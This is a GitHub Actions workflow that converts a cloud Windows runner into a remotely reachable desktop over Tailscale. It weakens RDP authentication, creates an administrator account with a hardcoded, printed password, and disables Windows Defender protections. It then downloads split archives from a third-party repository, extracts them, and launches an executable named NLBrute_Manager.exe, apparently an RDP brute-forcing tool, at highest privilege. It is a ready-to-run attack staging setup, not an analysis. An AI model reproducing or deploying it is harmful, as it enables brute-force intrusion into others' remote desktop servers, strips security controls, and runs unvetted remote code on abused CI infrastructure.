name: Windows Cloud RDP

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: 1. Enable Remote Desktop & Firewall
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0

      - name: 2. Create Admin Account
        run: |
          $Password = ConvertTo-SecureString "P@ssw0rd1qazXSW@#" -AsPlainText -Force
          New-LocalUser -Name "NvDAdmin" -Password $Password -PasswordNeverExpires -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Administrators" -Member "NvDAdmin" -ErrorAction SilentlyContinue
          net user runneradmin P@ssw0rd1qazXSW@#

      - name: 3. Install & Connect Tailscale VPN
        env:
          TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
        run: |
          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi"
          Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
          Start-Sleep -Seconds 5
          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="github-rdp-server"
          Start-Sleep -Seconds 8
          $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
          Write-Host "==================================================" -ForegroundColor Green
          Write-Host "  Tailscale IP : $ts_ip" -ForegroundColor Yellow
          Write-Host "  Username     : NvdAdmin" -ForegroundColor Yellow
          Write-Host "  Password     : P@ssw0rd1qazXSW@#" -ForegroundColor Yellow
          Write-Host "==================================================" -ForegroundColor Green

      - name: 4. Deploy and Launch via Interactive Task
        shell: powershell
        run: |
          # 1. Setup Workspace
          $workDir = "C:\target_app"
          if (Test-Path $workDir) { Remove-Item -Recurse -Force $workDir -ErrorAction SilentlyContinue }
          New-Item -ItemType Directory -Path $workDir -Force | Out-Null
          Set-Location -Path $workDir

          # 2. Disable Security
          Write-Host "Disabling Windows Defender..." -ForegroundColor Cyan
          Set-MpPreference -DisableRealtimeMonitoring $true
          Set-MpPreference -DisableIOAVProtection $true
          Set-MpPreference -DisableBehaviorMonitoring $true
          Set-MpPreference -DisableScriptScanning $true

          # 3. Download Initial Split Zip Files
          $filesToDownload = @(
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z01",
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z02",
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z03",
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.zip"
          )

          Write-Host "Downloading initial files..." -ForegroundColor Yellow
          foreach ($url in $filesToDownload) {
              $fileName = Split-Path $url -Leaf
              Invoke-WebRequest -Uri $url -OutFile "$workDir\$fileName"
          }

          # 4. Deep Extraction Loop
          Write-Host "Starting Aggressive Extraction..." -ForegroundColor Cyan
          $maxIterations = 5
          $iteration = 0
          $foundZip = $true

          while ($foundZip -and $iteration -lt $maxIterations) {
              $iteration++
              Write-Host "Iteration number: ${iteration}" -ForegroundColor Yellow
              $zips = Get-ChildItem -Path $workDir -Filter "*.zip" -Recurse
              if ($zips.Count -eq 0) { $foundZip = $false } 
              else {
                  foreach ($zip in $zips) {
                      Write-Host "Extracting: $($zip.FullName)" -ForegroundColor Cyan
                      $targetFolder = $zip.DirectoryName
                      & "C:\Program Files\7-Zip\7z.exe" x "$($zip.FullName)" "-o$targetFolder" -y | Out-Null
                      Start-Sleep -Seconds 3
                  }
                  $foundZip = $true 
              }
          }

          # 5. Find the specific EXE
          $targetExeName = "NLBrute_Manager.exe"
          $exeFile = Get-ChildItem -Path $workDir -Filter $targetExeName -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1

          if ($exeFile) {
              $exePath = $exeFile.FullName
              $exeDir = Split-Path $exePath -Parent
              Write-Host "SUCCESS! Found: $exePath" -ForegroundColor Green

              # 6. THE INTERACTIVE FIX: Use Scheduled Task to force GUI visibility
              # We create a task that runs as the local system but is set to run only when the user is logged in.
              # This forces it into the interactive desktop session.
              
              Write-Host "Creating Interactive Launch Task..." -ForegroundColor Cyan
              
              # We use a command to launch the app via cmd to ensure it spawns correctly
              $launchCmd = "cmd.exe /c cd /d `"$exeDir`" && start `"`"$targetExeName`""
              
              # Create a scheduled task that runs immediately
              # This bypasses the "Session 0" isolation issue
              & schtasks /create /tn "AppLauncher" /tr "$launchCmd" /sc once /st 00:00 /rl highest /f | Out-Null
              
              # Run the task immediately
              & schtasks /run /tn "AppLauncher" | Out-Null
              
              Write-Host "Task triggered. The app will appear on the desktop once RDP session is active." -ForegroundColor Green
          } else {
              Write-Host "CRITICAL ERROR: $targetExeName not found!" -ForegroundColor Red
              Get-ChildItem -Path $workDir -Recurse | Select-Object FullName | Out-File "$workDir\debug.txt"
          }

      - name: 5. Keep Server Alive (48 Hours)
        run: |
          for ($i = 1; $i -le 2880; $i++) {
            Start-Sleep -Seconds 60
            Write-Host "[$i/2880] Server running..."
          }
